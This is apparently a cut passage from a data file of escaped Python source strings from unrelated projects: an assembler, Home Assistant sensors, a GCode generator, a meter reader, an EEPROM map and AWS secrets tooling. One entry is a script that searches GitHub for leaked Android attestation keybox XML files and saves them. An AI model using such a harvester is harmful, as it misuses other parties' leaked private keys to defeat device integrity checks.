\u8d77\u59cb\u5730\u5740: {program_start:06X}\")\n            continue\n\n        if opcode == \"BASE\":\n            print(f\"\u6aa2\u6e2c\u5230 BASE \u6307\u4ee4\uff0c\u64cd\u4f5c\u6578: {operand}\")\n            continue\n\n        if label:\n            if label in symbol_table:\n                print(f\"\u932f\u8aa4: \u91cd\u8907\u7684\u6a19\u7c64 {label}\")\n                sys.exit(1)\n            symbol_table[label] = location_counter\n            print(f\"\u65b0\u589e\u6a19\u7c64 {label}, \u5730\u5740: {location_counter:04X}\")\n\n        if opcode.startswith('+'):\n            length = 4\n        elif opcode == \"BYTE\":\n            length = len(operand[2:-1]) if operand.startswith(\"C'\") else len(operand[2:-1]) // 2\n        elif opcode == \"WORD\":\n            length = 3\n        elif opcode == \"RESB\":\n            length = int(operand)\n        elif opcode == \"RESW\":\n            length = int(operand) * 3\n        elif opcode in OPTAB:\n            length = 2 if OPTAB[opcode] in [\"A0\", \"B4\", \"B8\"] else 3\n        else:\n            length = 3\n        last_address = location_counter  # \u8a18\u9304\u6700\u5f8c\u7684\u6709\u6548\u5730\u5740\n        location_counter += length\n\n    program_length = last_address - program_start\n    header_record = f\"H^{program_name:<6}^{program_start:06X}^{program_length:06X}\"\n\n    print(\"\\n=== Step 3: \u751f\u6210\u76ee\u6a19\u7a0b\u5f0f\u78bc ===\")\n    location_counter = program_start\n\n    for line in lines:\n        parts = line.split()\n        if len(parts) == 3:\n            label, opcode, operand = parts\n        elif len(parts) == 2:\n            label, opcode, operand = None, *parts\n        else:\n            label, opcode, operand = None, parts[0], None\n\n        if opcode in [\"START\", \"END\", \"RESB\", \"RESW\", \"BASE\"]:\n            if opcode == \"RESB\":\n                location_counter += int(operand)  # \u589e\u52a0 RESB \u5b9a\u7fa9\u7684\u7a7a\u9593\u5927\u5c0f\n            elif opcode == \"RESW\":\n                location_counter += int(operand) * 3  # \u589e\u52a0 RESW \u5b9a\u7fa9\u7684\u7a7a\u9593\u5927\u5c0f\n            if opcode == \"BASE\":\n                if operand in symbol_table:\n                    base_register = symbol_table[operand]\n                    print(f\"\u8a2d\u5b9a BASE \u5bc4\u5b58\u5668\u70ba: {base_register:04X}\")\n                else:\n                    print(f\"\u932f\u8aa4: BASE \u64cd\u4f5c\u6578 {operand} \u4e0d\u5b58\u5728\u65bc\u7b26\u865f\u8868\u4e2d\")\n                    base_register = None\n            continue\n\n        if opcode == \"BYTE\":\n            if operand.startswith(\"C'\"):\n                code = ''.join(format(ord(c), '02X') for c in operand[2:-1])\n            elif operand.startswith(\"X'\"):\n                code = operand[2:-1]\n            object_code = code\n        elif opcode == \"WORD\":\n            value = int(operand)\n            object_code = f\"{value:06X}\"\n        elif opcode == \"RSUB\":\n            object_code = \"4F0000\"\n        elif opcode in [\"CLEAR\", \"COMPR\", \"TIXR\"]:\n            # Format 2 \u8655\u7406\n            op_code = OPTAB[opcode]\n            if opcode == \"CLEAR\":\n                r1 = REGISTER_TABLE[operand]\n                object_code = f\"{op_code}{r1:01X}0\"\n            elif opcode == \"COMPR\":\n                r1, r2 = operand.split(\",\")\n                object_code = f\"{op_code}{REGISTER_TABLE[r1]:01X}{REGISTER_TABLE[r2]:01X}\"\n            elif opcode == \"TIXR\":\n                r1 = REGISTER_TABLE[operand]\n                object_code = f\"{op_code}{r1:01X}0\"\n        else:\n            # Format 3/4 \u8655\u7406\n            op_code = OPTAB[opcode.lstrip('+')]\n            if operand.startswith('#'):\n                n_flag, i_flag = 0, 1  # Immediate addressing\n                operand = operand[1:]\n                if operand.isdigit():\n                    ad",
    "\"\"\"Rachio sensor platform.\"\"\"\nimport logging\nfrom datetime import datetime\n\nfrom homeassistant.components.sensor import (\n    SensorEntity, \n    SensorDeviceClass, \n    SensorStateClass\n)\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.core import HomeAssistant\nfrom homeassistant.helpers.entity_platform import AddEntitiesCallback\nfrom homeassistant.helpers.update_coordinator import CoordinatorEntity\n\nfrom .const import DOMAIN\n\n_LOGGER = logging.getLogger(__name__)\n\nasync def async_setup_entry(\n    hass: HomeAssistant,\n    config_entry: ConfigEntry,\n    async_add_entities: AddEntitiesCallback\n) -> None:\n    \"\"\"Set up Rachio sensors.\"\"\"\n    coordinator = hass.data[DOMAIN][config_entry.entry_id]\n    \n    # Create sensors\n    sensors = []\n    \n    # Device-level sensor\n    sensors.append(RachioDeviceStatusSensor(coordinator))\n    \n    # Sensors for ALL zones\n    for zone in coordinator.zones:\n        sensors.extend([\n            RachioZoneLastWateredSensor(coordinator, zone),\n            RachioZoneStatusSensor(coordinator, zone)\n        ])\n    \n    # Sensors for ALL schedules\n    for schedule in coordinator.schedules:\n        sensors.append(RachioScheduleStatusSensor(coordinator, schedule))\n    \n    async_add_entities(sensors)\n\nclass RachioDeviceStatusSensor(CoordinatorEntity, SensorEntity):\n    \"\"\"Representation of the Rachio device status sensor.\"\"\"\n\n    def __init__(self, coordinator):\n        \"\"\"Initialize the sensor.\"\"\"\n        super().__init__(coordinator)\n        self._attr_name = \"Rachio Device Status\"\n        self._attr_unique_id = f\"{DOMAIN}_device_status\"\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the device.\"\"\"\n        return self.coordinator.device_info.get('status', 'Unknown')\n\n    @property\n    def extra_state_attributes(self):\n        \"\"\"Return device information.\"\"\"\n        return {\n            \"device_id\": self.coordinator.device_id,\n            \"name\": self.coordinator.device_info.get('name'),\n            \"model\": self.coordinator.device_info.get('model')\n        }\n\nclass RachioZoneLastWateredSensor(CoordinatorEntity, SensorEntity):\n    \"\"\"Representation of a Rachio zone last watered timestamp sensor.\"\"\"\n\n    def __init__(self, coordinator, zone):\n        \"\"\"Initialize the sensor.\"\"\"\n        super().__init__(coordinator)\n        self._zone = zone\n        self._attr_name = f\"Rachio {zone['name']} Last Watered\"\n        self._attr_unique_id = f\"rachio_zone_{zone['id']}_last_watered\"\n        self._attr_device_class = SensorDeviceClass.TIMESTAMP\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the sensor.\"\"\"\n        last_watered = self._zone.get('lastWateredDate')\n        if last_watered:\n            return datetime.fromtimestamp(last_watered / 1000).isoformat()\n        return None\n\nclass RachioZoneStatusSensor(CoordinatorEntity, SensorEntity):\n    \"\"\"Representation of a Rachio zone status sensor.\"\"\"\n\n    def __init__(self, coordinator, zone):\n        \"\"\"Initialize the sensor.\"\"\"\n        super().__init__(coordinator)\n        self._zone = zone\n        self._attr_name = f\"Rachio {zone['name']} Status\"\n        self._attr_unique_id = f\"rachio_zone_{zone['id']}_status\"\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the zone.\"\"\"\n        return self._zone.get('status', 'Unknown')\n\n    @property\n    def extra_state_attributes(self):\n        \"\"\"Return additional zone attributes.\"\"\"\n        return {\n            \"zone_id\": self._zone['id'],\n            \"zone_number\": self._zone.get('zoneNumber'),\n            \"enabled\": self._zone.get('enabled', False)\n        }\n\nclass RachioScheduleStatusSensor(CoordinatorEntity, SensorEntity):\n    \"\"\"Representation of a Rachio schedule status sensor.\"\"\"\n\n    def __init__(self, coordinator, schedule):\n        \"\"\"Initialize the sensor.\"\"\"\n        super().__init__(coordinator)\n        self._schedule = schedule\n        self._attr_name = f\"Rachio {schedule.get('name', 'Unknown')} Schedule Status\"\n        self._attr_unique_id = f\"rachio_schedule_{schedule.get('id')}_status\"\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the schedule.\"\"\"\n        return self._schedule.get('status', 'Unknown')\n\n    @property\n    def extra_state_attributes(self):\n        \"\"\"Return additional schedule attributes.\"\"\"\n        return {\n            \"schedule_id\": self._schedule['id'],\n            \"schedule_name\": self._schedule.get('name'),\n            \"total_duration\": self._schedule.get('totalDuration')\n        }\n",
    "import argparse\nimport numpy as np\nimport os\nimport sys\nfrom trace_generator import TraceGenerator\nfrom PIL import Image\nfrom toolpaths import *\nfrom toolpath_generator import ToolpathGenerator\n\nclass GCodeGenerator: \n    def __init__(self, toolpaths, output_path, feed_rate=500.0): \n        self.toolpaths = toolpaths\n        self.feed_rate = feed_rate\n        self.output_path = output_path\n        self.gcode = []\n        self.pen_up_command = PenUp()\n        self.pen_down_command = PenDown()\n    \n    def return_to_home_gcode(self): \n        return LinearMove(0, 0).to_gcode()\n    \n    def generate_header(self): \n        self.gcode.append(\"; GCode generated from image by Saad Ata.\")\n        self.gcode.append(\"G21 ; Set units to millimeters.\")\n        self.gcode.append(\"G90 ; Use absolute positioning.\")\n        self.gcode.append(self.pen_up_command.to_gcode())\n        self.gcode.append(self.return_to_home_gcode())\n    \n    def convert_toolpath_to_gcode(self): \n        for toolpath in self.toolpaths: \n            for i, command in enumerate(toolpath):\n                # 0th command moves pen gantry to correct location with pen up. \n                # 1st command moves pen down to begin drawing. \n                if i == 0: \n                    self.gcode.append(self.pen_up_command.to_gcode())\n                elif i == 1: \n                    self.gcode.append(self.pen_down_command.to_gcode()) \n                self.gcode.append(command.to_gcode())\n    \n    def generate_footer(self): \n        self.gcode.append(self.pen_up_command.to_gcode())\n        self.gcode.append(self.return_to_home_gcode())\n        self.gcode.append(\"M2 ; End the program.\")\n    \n    def compile_gcode(self): \n        self.generate_header()\n        self.convert_toolpath_to_gcode()\n        self.generate_footer()\n    \n    def save_gcode(self): \n        with open(os.path.join(self.output_path, 'output.txt'), 'w') as f: \n            f.write(\"\\n\".join(self.gcode))\n\ndef main(): \n    parser = argparse.ArgumentParser(description=\"Convert a image into GCode by Saad Ata.\")\n    parser.add_argument(\"--input\", \"-i\", required=True, help=\"Path to input image.\")\n    parser.add_argument(\"--output\", \"-o\", required=True, help=\"Path to output GCode file.\")\n    parser.add_argument(\"--threshold\", type=int, default=128,\n                        help=\"Threshold for binarizing the image (0-255). Default=128\")\n    parser.add_argument(\"--scale\", type=float, default=1,\n                        help=\"Pixel to machine unit scale.\")\n    parser.add_argument(\"--arc_tolerance\", type=float, default=0,\n                        help=\"Maximum allowable deviation for arc fitting.\")\n    args = parser.parse_args()\n   \n    try:\n        img = Image.open(args.input).convert(\"L\")\n    except IOError:\n        print(f\"Could not open the file.\")\n        sys.exit(1)\n\n    # First convert the image to binary.\n    # Every ON (1) pixel is where we need to draw. \n    width, height = img.size\n    pixels = np.array(img)\n    binary_image = np.where(pixels >= args.threshold, 0, 1)\n\n    # Find the connected lines. \n    trace_generator = TraceGenerator(binary_image, width, height)\n    traces = trace_generator.find_all_moore_traces()\n\n    # Turn lines into toolpaths. \n    # This converter supports G1 (line) and G2/G3 (circular) instructions. \n    toolpath_gen = ToolpathGenerator(traces, scale=1, arc_tolerance=args.arc_tolerance)\n    toolpath_gen.generate_toolpaths()\n\n    # Turn the toolpaths into text which can be loaded directly to a CNC machine.\n    gcode_gen = GCodeGenerator(\n        toolpaths=toolpath_gen.toolpaths,\n        output_path=args.output, \n        feed_rate=500\n    )\n    gcode_gen.compile_gcode()\n    gcode_gen.save_gcode()\n\nif __name__ == '__main__':\n    main()\n",
    "\"\"\"Shared functions for state management.\"\"\"\n\nimport hashlib\nimport uuid\nfrom typing import Any, Literal, Optional, Union\nimport yaml\nfrom langchain_core.documents import Document\n\n\ndef load_config(file_path=\"./config.yaml\"):\n    \"\"\"\n    Loads the configuration from the YAML file.\n    \"\"\"\n    with open(file_path, 'r') as file:\n        config = yaml.safe_load(file)\n    return config\n\n\ndef new_uuid():\n    return str(uuid.uuid4())\n\n\n\ndef _generate_uuid(page_content: str) -> str:\n    \"\"\"Generate a UUID for a document based on page content.\"\"\"\n    md5_hash = hashlib.md5(page_content.encode()).hexdigest()\n    return str(uuid.UUID(md5_hash))\n\n\ndef reduce_docs(\n    existing: Optional[list[Document]],\n    new: Union[\n        list[Document],\n        list[dict[str, Any]],\n        list[str],\n        str,\n        Literal[\"delete\"],\n    ],\n) -> list[Document]:\n    \"\"\"Reduce and process documents based on the input type.\n\n    This function handles various input types and converts them into a sequence of Document objects.\n    It can delete existing documents, create new ones from strings or dictionaries, or return the existing documents.\n    It also combines existing documents with the new one based on the document ID.\n\n    Args:\n        existing (Optional[Sequence[Document]]): The existing docs in the state, if any.\n        new (Union[Sequence[Document], Sequence[dict[str, Any]], Sequence[str], str, Literal[\"delete\"]]):\n            The new input to process. Can be a sequence of Documents, dictionaries, strings, a single string,\n            or the literal \"delete\".\n    \"\"\"\n    if new == \"delete\":\n        return []\n\n    existing_list = list(existing) if existing else []\n    if isinstance(new, str):\n        return existing_list + [\n            Document(page_content=new, metadata={\"uuid\": _generate_uuid(new)})\n        ]\n\n    new_list = []\n    if isinstance(new, list):\n        existing_ids = set(doc.metadata.get(\"uuid\") for doc in existing_list)\n        for item in new:\n            if isinstance(item, str):\n                item_id = _generate_uuid(item)\n                new_list.append(Document(page_content=item, metadata={\"uuid\": item_id}))\n                existing_ids.add(item_id)\n\n            elif isinstance(item, dict):\n                metadata = item.get(\"metadata\", {})\n                item_id = metadata.get(\"uuid\") or _generate_uuid(\n                    item.get(\"page_content\", \"\")\n                )\n\n                if item_id not in existing_ids:\n                    new_list.append(\n                        Document(**{**item, \"metadata\": {**metadata, \"uuid\": item_id}})\n                    )\n                    existing_ids.add(item_id)\n\n            elif isinstance(item, Document):\n                item_id = item.metadata.get(\"uuid\", \"\")\n                if not item_id:\n                    item_id = _generate_uuid(item.page_content)\n                    new_item = item.copy(deep=True)\n                    new_item.metadata[\"uuid\"] = item_id\n                else:\n                    new_item = item\n\n                if item_id not in existing_ids:\n                    new_list.append(new_item)\n                    existing_ids.add(item_id)\n\n    return existing_list + new_list\n\n\n\n\n# Load the configuration file and make it available globally\nconfig = load_config()",
    "# meter_reading.py\r\nimport cv2\r\nimport numpy as np\r\nimport tensorflow as tf\r\n# from tflite_runtime.interpreter import Interpreter\r\nimport logging\r\nimport argparse\r\nimport requests\r\nimport os\r\nimport sys\r\nimport json\r\nimport ast\r\n\r\n# Set up logging for better output control\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\nclass MeterReader:\r\n    def __init__(self, model_path):\r\n        \"\"\"\r\n        Initialize the MeterReader with a TensorFlow Lite model.\r\n        \r\n        Args:\r\n            model_path (str): Path to the TensorFlow Lite model file.\r\n        \"\"\"\r\n        print(f\"Loading model from: {os.path.abspath(model_path)}\")\r\n        if not os.path.exists(model_path):\r\n            raise FileNotFoundError(f\"Model file not found: {model_path}\")\r\n        # Load the TensorFlow Lite model\r\n        self.interpreter = tf.lite.Interpreter(model_path=model_path)  # for tensorflow\r\n        # self.interpreter = Interpreter(model_path=model_path)  # for tflite-runtime\r\n\r\n        self.interpreter.allocate_tensors()\r\n\r\n        # Get input and output details\r\n        self.input_details = self.interpreter.get_input_details() #[0][\"index\"]\r\n        self.output_details = self.interpreter.get_output_details() #[0][\"index\"]\r\n        \r\n        # print(self.input_details)\r\n        # [{'name': 'serving_default_batch_normalization_input:0', 'index': 0, 'shape': array([ 1, 32, 20,  3]), 'shape_signature': array([-1, 32, 20,  3]), 'dtype': <class 'numpy.float32'>, 'quantization': (0.0, 0), 'quantization_parameters': {'scales': array([], dtype=float32), 'zero_points': array([], dtype=int32), 'quantized_dimension': 0}, 'sparsity_parameters': {}}]\r\n        # print(self.output_details)\r\n        # [{'name': 'StatefulPartitionedCall:0', 'index': 38, 'shape': array([  1, 100]), 'shape_signature': array([ -1, 100]), 'dtype': <class 'numpy.float32'>, 'quantization': (0.0, 0), 'quantization_parameters': {'scales': array([], dtype=float32), 'zero_points': array([], dtype=int32), 'quantized_dimension': 0}, 'sparsity_parameters': {}}]\r\n\r\n        # Get input shape for preprocessing\r\n        self.input_shape = self.input_details[0]['shape'][1:3]\r\n\r\n    def preprocess_image(self, image):\r\n        \"\"\"\r\n        Preprocess the image for the TensorFlow Lite model.\r\n        \r\n        Args:\r\n            image (numpy.ndarray): Input image (RGB format).\r\n        \r\n        Returns:\r\n            numpy.ndarray: Preprocessed image (normalized, resized).\r\n        \"\"\"\r\n        if image is None or image.size == 0:\r\n            raise ValueError(\"Invalid or empty image provided for preprocessing.\")\r\n\r\n        # Resize the image to the model's input size\r\n        image = cv2.resize(image, (self.input_shape[1], self.input_shape[0]))\r\n\r\n        # Normalize the image to [0, 1] (uncomment if required by the model)\r\n        # image = image / 255.0\r\n\r\n        # Add batch dimension\r\n        image = np.expand_dims(image, axis=0).astype(np.float32)\r\n\r\n        return image\r\n\r\n    def predict(self, image):\r\n        \"\"\"\r\n        Predict the meter reading and confidence score from the input image.\r\n        \r\n        Args:\r\n            image (numpy.ndarray): Input image (RGB format).\r\n        \r\n        Returns:\r\n            float: Predicted meter reading.\r\n            float: Confidence score.\r\n        \"\"\"\r\n        # Preprocess the image\r\n        input_image = self.preprocess_image(image)\r\n\r\n        # Set the input tensor\r\n        self.interpreter.set_tensor(self.input_details[0]['index'], input_image)\r\n\r\n        # Run inference\r\n        self.interpreter.invoke()\r\n\r\n        # Get the output tensor (logits)\r\n        logits = self.interpreter.get_tensor(self.output_details[0]['index'])\r\n\r\n        # Apply softmax to convert logits to probabilities\r\n        probabilities = tf.nn.softmax(logits[0]).numpy() #The raw output (logits) from the model is passed through a softmax function to convert it into probabilities. This ensures that the values sum to 1 and represent confidence scores for each class\r\n\r\n        # Extract the predicted class (meter reading) and confidence score\r\n        predicted_class = np.argmax(probabilities)  # The predicted class is the index of the highest probability (np.argmax(probabilities)).\r\n        confidence_score = np.max(probabilities)    # The confidence score is the value of the highest probability (np.max(probabilities)).\r\n\r\n        # Convert the predicted class to a meter reading (assuming classes 0-99 correspond to digits 0.0-9.9)\r\n        meter_reading = predicted_class / 10  # class index divided by 10\r\n\r\n        return meter_reading, confidence_score\r\n\r\n    def visualize(self, image, regions, meter_readings, confidence_scores=None, raw=True, no_confidence=False):\r\n        \"\"\"\r\n        Visualize the meter readings and confidence scores on the image.\r\n        \r\n        Args:\r\n            image (numpy.ndarray): Input image (BGR format).\r\n            regions (list): List of tuples defining the regions (x1, y1, x2, y2).\r\n            meter_readings (list): ",
    "import requests\r\nfrom lxml import etree\r\nfrom pathlib import Path\r\nfrom dotenv import load_dotenv\r\nimport os\r\n\r\nfrom check import keybox_check as CheckValid\r\nimport hashlib\r\n\r\nhash = hashlib.sha256\r\nsession = requests.Session()\r\n\r\n# Load environment variables from .env file\r\nload_dotenv()\r\n\r\n# Access the token from environment variables\r\nGITHUB_TOKEN = os.getenv(\"GITHUB_TOKEN\")\r\n\r\nif not GITHUB_TOKEN:\r\n    raise ValueError(\"GITHUB_TOKEN is not set in the .env file\")\r\n\r\n# Search query\r\nsearch_query = \"<AndroidAttestation>\"\r\nsearch_url = f\"https://api.github.com/search/code?q={search_query}\"\r\n\r\n# Headers for the API request\r\nheaders = {\r\n    \"Authorization\": f\"token {GITHUB_TOKEN}\",\r\n    \"Accept\": \"application/vnd.github.v3+json\",\r\n}\r\n\r\nsave = Path(__file__).resolve().parent / \"keys\"\r\ncache_file = Path(__file__).resolve().parent / \"cache.txt\"\r\ncached_urls = open(cache_file, \"r\").readlines()\r\n\r\n\r\n# Function to fetch and print search results\r\ndef fetch_and_process_results(page):\r\n    params = {\"per_page\": 100, \"page\": page}\r\n    response = session.get(search_url, headers=headers, params=params)\r\n    if response.status_code != 200:\r\n        raise RuntimeError(f\"Failed to retrieve search results: {response.status_code}\")\r\n    search_results = response.json()\r\n    if \"items\" in search_results:\r\n        for item in search_results[\"items\"]:\r\n            file_name = item[\"name\"]\r\n            # Process only XML files\r\n            if file_name.lower().endswith(\".xml\"):\r\n                raw_url: str = (\r\n                    item[\"html_url\"].replace(\"github.com\", \"raw.githubusercontent.com\").replace(\"/blob/\", \"/\")\r\n                )\r\n                # check if the file exists in cache\r\n                if raw_url + \"\\n\" in cached_urls:\r\n                    continue\r\n                else:\r\n                    cached_urls.append(raw_url + \"\\n\")\r\n                # Fetch the file content\r\n                file_content = fetch_file_content(raw_url)\r\n                # Parse the XML\r\n                try:\r\n                    root = etree.fromstring(file_content)\r\n                except etree.XMLSyntaxError:\r\n                    continue\r\n                # Get the canonical form (C14N)\r\n                canonical_xml = etree.tostring(root, method=\"c14n\")\r\n                # Hash the canonical XML\r\n                hash_value = hashlib.sha256(canonical_xml).hexdigest()\r\n                file_name_save = save / (hash_value + \".xml\")\r\n                if not file_name_save.exists() and file_content and CheckValid(file_content):\r\n                    print(f\"{raw_url} is new\")\r\n                    with open(file_name_save, \"w\") as f:\r\n                        f.write(file_content)\r\n    return len(search_results[\"items\"]) > 0  # Return True if there could be more results\r\n\r\n\r\n# Function to fetch file content\r\ndef fetch_file_content(url: str):\r\n    response = session.get(url)\r\n    if response.status_code == 200:\r\n        return response.text\r\n    else:\r\n        raise RuntimeError(f\"Failed to download {url}\")\r\n\r\n\r\n# Fetch all pages\r\npage = 1\r\nhas_more = True\r\nwhile has_more:\r\n    has_more = fetch_and_process_results(page)\r\n    page += 1\r\n\r\n# update cache\r\nopen(cache_file, \"w\").writelines(cached_urls)\r\n\r\nfor file_path in save.glob(\"*.xml\"):\r\n    file_content = file_path.read_text()  # Read file content as a string\r\n    # Run CheckValid to determine if the file is still valid\r\n    if not CheckValid(file_content):\r\n        # Prompt user for deletion\r\n        user_input = input(f\"File '{file_path.name}' is no longer valid. Do you want to delete it? (y/N): \")\r\n        if user_input.lower() == \"y\":\r\n            try:\r\n                file_path.unlink()  # Delete the file\r\n                print(f\"Deleted file: {file_path.name}\")\r\n            except OSError as e:\r\n                print(f\"Error deleting file {file_path.name}: {e}\")\r\n        else:\r\n            print(f\"Kept file: {file_path.name}\")\r\n",
    "from EepromTypes import StructNode, ValueNode, NodeArray, ValueArray\nPpCvm441=StructNode(\"PpCvm441\",offset=0x0000, length=4096,\n    EepromInRam=StructNode(\"EepromInRam\",offset=0x0000, end=0x0073,\n        Ipei=ValueArray(\"Ipei\",offset=0x0000, end=0x0004, dtype=\"uchar\"),\n        BmcModulationDeviation=ValueNode(\"BmcModulationDeviation\",offset=0x0005, end=0x0005, dtype=\"uchar\"),\n        BmcDefaultFrequency=ValueNode(\"BmcDefaultFrequency\",offset=0x0006, end=0x0007, dtype=\"ushort\"),\n        RfLMX4x68Length=ValueNode(\"RfLMX4x68Length\",offset=0x0008, end=0x0008, dtype=\"uchar\"),\n        FixedEmc=ValueNode(\"FixedEmc\",offset=0x0009, end=0x000A, dtype=\"ushort\"),\n        FixedPhoenixInRamSectionReserved=ValueArray(\"FixedPhoenixInRamSectionReserved\",offset=0x000B, end=0x001F, dtype=\"uchar\"),\n        bFreqBandOffset=ValueNode(\"bFreqBandOffset\",offset=0x0020, end=0x0020, dtype=\"uchar\"),\n        bRssiScanType=ValueNode(\"bRssiScanType\",offset=0x0021, end=0x0021, dtype=\"uchar\"),\n        DiversityMode=ValueNode(\"DiversityMode\",offset=0x0022, end=0x0022, dtype=\"uchar\"),\n        bRssiLevel_UpperThreshold=ValueNode(\"bRssiLevel_UpperThreshold\",offset=0x0023, end=0x0023, dtype=\"uchar\"),\n        bRssiLevel_LowerThreshold=ValueNode(\"bRssiLevel_LowerThreshold\",offset=0x0024, end=0x0024, dtype=\"uchar\"),\n        ParkA=ValueArray(\"ParkA\",offset=0x0025, end=0x0029, dtype=\"uchar\"),\n        ParkB=ValueArray(\"ParkB\",offset=0x002A, end=0x002E, dtype=\"uchar\"),\n        ParkC=ValueArray(\"ParkC\",offset=0x002F, end=0x0033, dtype=\"uchar\"),\n        ParkD=ValueArray(\"ParkD\",offset=0x0034, end=0x0038, dtype=\"uchar\"),\n        PliA=ValueNode(\"PliA\",offset=0x0039, end=0x0039, dtype=\"uchar\"),\n        PliB=ValueNode(\"PliB\",offset=0x003A, end=0x003A, dtype=\"uchar\"),\n        PliC=ValueNode(\"PliC\",offset=0x003B, end=0x003B, dtype=\"uchar\"),\n        PliD=ValueNode(\"PliD\",offset=0x003C, end=0x003C, dtype=\"uchar\"),\n        PowerParameters=ValueNode(\"PowerParameters\",offset=0x003D, end=0x003D, dtype=\"uchar\"),\n        CoverageBeepLimit=ValueNode(\"CoverageBeepLimit\",offset=0x003E, end=0x003E, dtype=\"uchar\"),\n        AdaptivePowerCtrl=ValueNode(\"AdaptivePowerCtrl\",offset=0x003F, end=0x003F, dtype=\"uchar\"),\n        PowerLowRssiLimit=ValueNode(\"PowerLowRssiLimit\",offset=0x0040, end=0x0040, dtype=\"uchar\"),\n        PowerHighRssiLimit=ValueNode(\"PowerHighRssiLimit\",offset=0x0041, end=0x0041, dtype=\"uchar\"),\n        PowerCrcLimit=ValueNode(\"PowerCrcLimit\",offset=0x0042, end=0x0042, dtype=\"uchar\"),\n        PowerCrcHighCnt=ValueNode(\"PowerCrcHighCnt\",offset=0x0043, end=0x0043, dtype=\"uchar\"),\n        HandoverFreqDist=ValueNode(\"HandoverFreqDist\",offset=0x0044, end=0x0044, dtype=\"uchar\"),\n        ClSelect=ValueNode(\"ClSelect\",offset=0x0045, end=0x0045, dtype=\"uchar\"),\n        ScFlags=ValueNode(\"ScFlags\",offset=0x0046, end=0x0046, dtype=\"uchar\"),\n        ProtocolFeatures=ValueNode(\"ProtocolFeatures\",offset=0x0047, end=0x0047, dtype=\"uchar\"),\n        ProtocolFeatures2=ValueNode(\"ProtocolFeatures2\",offset=0x0048, end=0x0048, dtype=\"uchar\"),\n        RfPower4x1=NodeArray(\"RfPower4x1\",offset=0x0049, end=0x006C, nodes=[\n            StructNode(\"Element 0\",offset=0x0049, end=0x004E,\n                PA_CTRL1_REG=ValueArray(\"PA_CTRL1_REG\",offset=0x0049, end=0x004A, dtype=\"uchar\"),\n                TEST_MODE2_REG=ValueArray(\"TEST_MODE2_REG\",offset=0x004B, end=0x004C, dtype=\"uchar\"),\n                BBADC_CTRL_REG=ValueArray(\"BBADC_CTRL_REG\",offset=0x004D, end=0x004E, dtype=\"uchar\")\n            ),\n            StructNode(\"Element 1\",offset=0x004F, end=0x0054,\n                PA_CTRL1_REG=ValueArray(\"PA_CTRL1_REG\",offset=0x004F, end=0x0050, dtype=\"uchar\"),\n                TEST_MODE2_REG=ValueArray(\"TEST_MODE2_REG\",offset=0x0051, end=0x0052, dtype=\"uchar\"),\n                BBADC_CTRL_REG=ValueArray(\"BBADC_CTRL_REG\",offset=0x0053, end=0x0054, dtype=\"uchar\")\n            ),\n            StructNode(\"Element 2\",offset=0x0055, end=0x005A,\n                PA_CTRL1_REG=ValueArray(\"PA_CTRL1_REG\",offset=0x0055, end=0x0056, dtype=\"uchar\"),\n                TEST_MODE2_REG=ValueArray(\"TEST_MODE2_REG\",offset=0x0057, end=0x0058, dtype=\"uchar\"),\n                BBADC_CTRL_REG=ValueArray(\"BBADC_CTRL_REG\",offset=0x0059, end=0x005A, dtype=\"uchar\")\n            ),\n            StructNode(\"Element 3\",offset=0x005B, end=0x0060,\n                PA_CTRL1_REG=ValueArray(\"PA_CTRL1_REG\",offset=0x005B, end=0x005C, dtype=\"uchar\"),\n                TEST_MODE2_REG=ValueArray(\"TEST_MODE2_REG\",offset=0x005D, end=0x005E, dtype=\"uchar\"),\n                BBADC_CTRL_REG=ValueArray(\"BBADC_CTRL_REG\",offset=0x005F, end=0x0060, dtype=\"uchar\")\n            ),\n            StructNode(\"Element 4\",offset=0x0061, end=0x0066,\n                PA_CTRL1_REG=ValueArray(\"PA_CTRL1_REG\",offset=0x0061, end=0x0062, dtype=\"uchar\"),\n                TEST_MODE2_REG=ValueArray(\"TEST_MODE2_REG\",offset=0x0063, end=0x0064, dtype=\"uchar\"),\n                BBADC_CTRL_REG=ValueArray(\"BBADC_CTRL_REG\",offset=0x0065, end=0x0066, dtype=\"uchar\")\n            ),\n        ",
    "import marimo\n\n__generated_with = \"0.9.14\"\napp = marimo.App(width=\"medium\")\n\n\n@app.cell\ndef __(mo):\n    mo.md(\n        r\"\"\"\n        ## AWS Secrets Manager Utils\n\n        Wow - we can write a secret to multiple envs! But that's not really the point. \n\n        This example shows that  with Marimo that you can quickly have:\n        ```\n        - a CLI \n        - a GUI \"micro app\"\n        - a notebook\n        ```\n\n        with little change to the base code. \n        \"\"\"\n    )\n    return\n\n\n@app.cell\ndef __():\n    import subprocess\n    import marimo as mo\n\n    def bash(command):\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        return result.stdout.strip()\n    return bash, mo, subprocess\n\n\n@app.cell\ndef __(profiles):\n    def generate_aws_secrets_commands(secret_name, secret_string):\n        environments = ['dev', 'stage', 'prod']\n\n        region = 'us-west-2'\n\n\n        output = [\"Now youre good:\\n\\n\"]\n        print(str(output))\n        for env in environments:\n            profile = profiles[env]\n            aws_command = (f\"\"\"aws secretsmanager create-secret --region {region} --name '/{secret_name}' --secret-string '{secret_string}'\"\"\"\n            )\n            print(aws_command)\n            output.append(aws_command+\"\\n\")\n\n        return output\n    return (generate_aws_secrets_commands,)\n\n\n@app.cell\ndef __(mo):\n    # create the gui\n    form = (\n            mo.md('''\n            **GUI**\n\n            {secret_name}\n            {secret_string}\n        ''')\n        .batch(\n            secret_name=mo.ui.text(label=\"Secret Name - \\n\", placeholder=\"/NAME\"),\n            secret_string=mo.ui.text(label=\"Secret (actual string)\"),\n        )\n        .form()\n    )\n    return (form,)\n\n\n@app.cell\ndef __(form, mo):\n    mo.vstack([form, mo.md(f\"Has value: {form.value}\")])\n    return\n\n\n@app.cell\ndef __(form, generate_aws_secrets_commands, mo):\n    if mo.cli_args():\n        output = \"\"\n        generate_aws_secrets_commands(\n            mo.cli_args().get(\"secret_name\"), mo.cli_args().get(\"secret_string\")\n        )\n\n    elif form.value:\n        form_value = form.value\n        output = generate_aws_secrets_commands(\n            form_value.get(\"secret_name\"), form_value.get(\"secret_string\")\n        )\n\n    else:\n        output = \"\"\n\n    output\n    return form_value, output\n\n\n@app.cell\ndef __(mo, output):\n    mo.md(\"\\n\".join(output))\n    return\n\n\n@app.cell\ndef 